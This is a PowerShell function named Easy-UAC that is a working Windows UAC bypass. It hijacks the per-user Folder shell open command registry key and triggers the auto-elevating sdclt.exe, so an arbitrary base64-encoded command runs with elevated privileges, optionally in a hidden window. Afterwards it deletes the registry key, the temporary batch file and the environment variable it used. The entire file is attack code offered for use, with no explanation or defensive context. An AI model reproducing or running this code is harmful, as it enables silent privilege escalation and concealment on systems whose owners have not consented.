function Easy-UAC {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Command,
		[Parameter(Mandatory = $false, Position = 1)]
		[switch]
		$Hidden,
		[Parameter(Mandatory = $false, Position = 2)]
		[switch]
		$NoExitHost,
		[Parameter(Mandatory = $false, Position = 3)]
		[switch]
		$NoExitChild,
		[Parameter(Mandatory = $false, Position = 4)]
		[Int64]
		$SleepDuration = 2
	)
	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "powershell -WindowStyle Hidden  -c ''"} else {$hide = ""}
	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
	$Path = $env:TEMP + '\A.bat'
	$Value = "$hide;Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User) | Write-Verbose
	New-Item -Path $Path -Value '%A%' | Write-Verbose
	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path | Write-Verbose
	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Write-Verbose
	(sdclt.exe) | Out-Null
	Start-Sleep $SleepDuration | Write-Verbose
	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command' -Force | Write-Verbose
	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User) | Write-Verbose
	Remove-Item $Path | Write-Verbose
	if (!$NoExitHost) {Exit;Exit;Exit}
}